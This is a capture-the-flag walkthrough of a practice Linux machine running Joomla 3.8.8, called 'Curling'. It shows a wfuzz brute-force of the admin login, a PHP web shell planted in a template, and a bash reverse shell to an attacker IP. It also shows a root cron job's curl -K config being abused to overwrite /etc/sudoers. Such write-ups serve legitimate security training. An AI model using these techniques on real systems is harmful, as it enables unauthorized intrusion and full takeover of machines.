# Curling
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan, Directory & File Enumeration, Base64 Decoding | Identified open ports 22 (SSH) and 80 (HTTP) running Joomla 3.8.8. Found a `secret.txt` file which contained a base64-encoded string that decoded to a potential password: `Curling2018!`. |
| 2 | (Web) | Password Spraying with `wfuzz` | Used `cewl` to create a wordlist and then `wfuzz` to perform a password spray against the Joomla administrator login page. The password `Curling2018!` worked with the username `Floris`. |
| 3 | www-data | Joomla Vulnerability (Authenticated Arbitrary File Upload), Reverse Shell | Logged into the Joomla admin panel, edited the `protostar` template's `index.php` file to include a PHP web shell. Executed the web shell to download and run a reverse shell script, gaining a shell as the `www-data` user. |
**| 4 | www-data | File Obfuscation, Steganography (Multiple layers) | Discovered a `password_backup` file in Floris's home directory. It was a multi-layered obfuscated file requiring a sequence of `xxd -r`, `bzip2`, `gzip`, and `tar` commands to extract a password. The final password was `5d<wdCbdZu)|hChXll`. >|
| 5 | floris | SSH Login | Used the extracted password `5d<wdCbdZu)|hChXll` >to log in as the `floris` user via SSH. |
| 6 | floris | Cron Job Misconfiguration, Local File Inclusion via `curl -K` | Discovered a cron job running as root that used `curl -K` with a user-writable input file. The cron job's configuration file was being updated by `cat /root/default.txt`, revealing the cron job itself. |
| 7 | root | `sudoers` File Overwrite, Privilege Escalation | Exploited the cron job by modifying the `input` file to instruct `curl` to download a malicious `sudoers` file from a local web server and write it to `/etc/sudoers`. This granted the `floris` user `sudo` access, allowing a final `sudo su -` to gain a root shell. | 

## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
Host is up (0.049s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see there is only port 80 and 22 open.  
The operating system is Ubuntu Linux.  
Before even start digging into port 80, we can see from our nmap --vuln scan that the webserver is running joomla CMS version 3.8.8.  
```
| http-enum:
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /administrator/manifests/files/joomla.xml: Joomla version 3.8.8
|   /language/en-GB/en-GB.xml: Joomla version 3.8.8
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /bin/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder
```
If we open the site, we can see a title "cewl curling site".  
Since cewl is a kali tool, let's use it against this page and generate a dictionary (cewl.txt) for further use:
```
[root@kali Curling ]$ cewl -w cewl.txt http://$TARGET
```
Now, let's start joomscan in background and dig deeper into the site.  
If we inspect the source code, we can find a comment: ```<!-- secret.txt -->```.  
So, let's open secret.txt
```
Q3VybGluZzIwMTgh
```
if we base64 decode this, we get something that looks really similar to a password:
```
[root@kali Curling ]$ cat secret.txt | base64 -d
Curling2018!#                 
```
So given the password, we can try to bruteforce the login using wfuzz and the cewl.txt wordlist.  
To do so we need to intercept the login request via burp, copy post data and cookies and pass it to wfuzz, replacing the parameter we want to brute with the keyword 'FUZZ'.  
When crafted the request will look as follows:  
```
[root@kali Curling ]$ wfuzz -w cewl.txt -b 'c0548020854924e0aecd05ed9f5b672b=v9ff8b7f27jb4i2c9t6ti6t71t; 99fb082d992a92668ce87e5540bd20fa=oura4b5mvht020nn76f54elo6v' -d 'username=FUZZ&passwd=Curling2018!&option=com_login&task=login&return=aW5kZXgucGhw&5338e62bfbd7d9179283485d7f71e932=1' -p 127.0.0.1:8080 -c http://10.10.10.150/administrator/index.php
```
Now we can run wfuzz and we get the following output:
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.150/administrator/index.php
Total requests: 218

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

[... SNIP ...]
000000207:   200        114 L    373 W      5403 Ch     "row"
000000208:   200        114 L    373 W      5403 Ch     "associated"
000000205:   200        114 L    373 W      5403 Ch     "items"
000000209:   200        114 L    373 W      5403 Ch     "Your"
000000203:   200        114 L    373 W      5403 Ch     "verification"
000000201:   200        114 L    373 W      5403 Ch     "enter"
000000199:   200        114 L    373 W      5403 Ch     "Prev"
000000195:   200        114 L    373 W      5403 Ch     "will"
000000204:   200        114 L    373 W      5403 Ch     "code"
000000200:   200        114 L    373 W      5403 Ch     "Please"
000000194:   200        114 L    373 W      5403 Ch     "account"
000000193:   200        114 L    373 W      5403 Ch     "address"
000000202:   200        114 L    373 W      5403 Ch     "Submit"
000000197:   200        114 L    373 W      5403 Ch     "item"
000000196:   200        114 L    373 W      5403 Ch     "Next"
000000192:   200        114 L    373 W      5403 Ch     "email"
000000187:   303        0 L      0 W        0 Ch        "Floris"
000000188:   200        114 L    373 W      5403 Ch     "Email"
000000185:   200        114 L    373 W      5403 Ch     "content"
000000218:   200        114 L    373 W      5403 Ch     "new"
000000217:   200        114 L    373 W      5403 Ch     "choose"
000000191:   200        114 L    373 W      5403 Ch     "Atom"
000000189:   200        114 L    373 W      5403 Ch     "Address
```
As we can see, one of the request is giving 303 instead of 200. So we can guess that that request logins with user 'Floris' refers to a successful login.

## User
Once we are logged in into joomla administration page, we can navigate to Extensions -> Template -> Templates.  
Here there are two templates available, if we go back to the index source, we can see that the one that is installed is protostar:  
```
<link href="/templates/protostar/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
<link href="/templates/protostar/css/template.css?b6bf078482bc6a711b54fa9e74e19603" rel="stylesheet" />
```
So let's upload our payload into this one.  
Let's edit the template index.php and add the following:
```
<?php system($_REQUEST['cmd']); ?>
```
Now let's use index.php to pop a shell.  
Let' create a shell file b0d.sh containing:
```
bash -i &> /dev/tcp/10.10.14.18/4444 0>&1
```
Let's host it using SimpleHTTPServer on port 80 and run the following request:  
```
[root@kali ~ ]$ nc -lvnp 4444                        
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.150] 36214
bash: cannot set terminal process group (1298): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/var/www/html$
```
And we do get a shell as www-data.  
Now, if we try to read the user's flag we do get permission denied. obviously, we do not have the permisison to read this file:
```
www-data@curling:/home/floris$ cat user.txt
cat: user.txt: Permission denied
www-data@curling:/home/floris$ ls -l
total 12
drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 May 22  2018 user.txt
```
we can see that there is a password_backup file, now there is a bit of stego challenge.  
Process of deobfuscation will be listed below as everything is quite straight forward:
```
www-data@curling:/home/floris$ cat password_backup
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
www-data@curling:/home/floris$ xxd -r password_backup
BZh91AY&SYHAP)ava:4NnT#@%`
"n                         z@i4hdi9hQdh4i5nh*}y.<~x>    sVTzHߢ1V`Fs
  ۇ7j:XdRk )p7۫;9PCYP    HB*     G U@rrE8PH
www-data@curling:/home/floris$ xxd -r password_backup > /tmp/1
www-data@curling:/home/floris$ cd /tmp/
www-data@curling:/tmp$ file 1
1: bzip2 compressed data, block size = 900k
www-data@curling:/tmp$ bzcat 1
l[passwordrBZh91AY&SY6Ǎ@@Pt t"dhhOPIS@68ET>P@#I bՃ|3x(*N&Hk1x"{]B@6m
www-data@curling:/tmp$ bzcat 1 > 2
www-data@curling:/tmp$ file 2
2: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix
www-data@curling:/tmp$ zcat 2
BZh91AY&SY6Ǎ@@Pt t"dhhOPIS@68ET>P@#I bՃ|3x(*N&Hk1x"{]B@6
www-data@curling:/tmp$ zcat 2 > 3
www-data@curling:/tmp$ file 3
3: bzip2 compressed data, block size = 900k
www-data@curling:/tmp$ bzcat 3
password.txt0000644000000000000000000000002313301066143012147 0ustar  rootroot5d<wdCbdZu)|hChXll
www-data@curling:/tmp$ bzcat 3 > 4
www-data@curling:/tmp$ file 4
4: POSIX tar archive (GNU)
www-data@curling:/tmp$ tar -xvf 4
password.txt
www-data@curling:/tmp$ cat password.txt
5d<wdCbdZu)|hChXll
```
Now we can use this password to login as floris.  
As we do have password, if we want we can login via ssh to get a more reliable connection.

## Root
Once we are logged in as floris, as we may have noticed from previous steps, we can find a directory "admin-area".  
If we browse this directory, we will find two files:
```
floris@curling:~$ cd admin-area/
floris@curling:~/admin-area$ ls -la
total 28
drwxr-x--- 2 root   floris  4096 May 22  2018 .
drwxr-xr-x 6 floris floris  4096 May 22  2018 ..
-rw-rw---- 1 root   floris    25 Dec 15 22:03 input
-rw-rw---- 1 root   floris 14236 Dec 15 22:03 report
floris@curling:~/admin-area$ date
Wed Dec 15 22:03:37 UTC 2021
```
As we can see there are two files: input and report, both modified in the current time. So we can suppose that there is a cron that somehow is editing this files.  
If we inspect input we can see the following:
```
floris@curling:~/admin-area$ cat input
url = "http://127.0.0.1"
```
now if we use SimpleHTTPServer and change this file setting our ip instead of localhost, we can se that a request hits our webserver.  
So now we can suppose that there is a curl that gets executed every minute inside crontab and write output inside the 'report' file.
to verify this we can change the input file as follows:
```
url = "file:///var/spool/cron/crontabs/root"
```
and in 'report' file we can see the following:
```
[... SNIP ...]
# m h  dom mon dow   command
* * * * * curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
* * * * * sleep 1; cat /root/default.txt > /home/floris/admin-area/input
```
Instead of guessing or using this kind of privileged LFI, we can run [pspy64](https://github.com/DominicBreuker/pspy) with user floris and see that we can get the same information retrived above:
```
2021/12/15 22:32:01 CMD: UID=0    PID=4495   | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input
2021/12/15 22:32:01 CMD: UID=0    PID=4494   | /usr/sbin/CRON -f
2021/12/15 22:32:01 CMD: UID=0    PID=4493   | /usr/sbin/CRON -f
2021/12/15 22:32:01 CMD: UID=0    PID=4498   | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```
Now, Obviously now we can cat /root/root.txt file, but we don't want that, we want the shell!  
To achieve this, we can inspect curl manual for -K
```
-K, --config <file>

       Specify a text file to read curl arguments from. The command line arguments found in the text file will be used as if they were provided on the command line.

       [... SNIP ...]

       # --- Example file ---
       # this is a comment
       url = "example.com"
       output = "curlhere.html"
       user-agent = "superagent/1.0"
```
so now we can edit the input file as follows:
```
url = "http://10.10.14.18/sudoers"
output = "/etc/sudoers"
user-agent = "b0d/1.0"
```
And host on our machine a sudoers file containing the following:
```
# User privilege specification
root    ALL=(ALL:ALL) ALL
floris  ALL=(ALL:ALL) ALL
```
so, now, to become root, we can simply:  
```
floris@curling:~/admin-area$ sudo su -
[sudo] password for floris:
root@curling:~# id
uid=0(root) gid=0(root) groups=0(root)
```
and we own root.
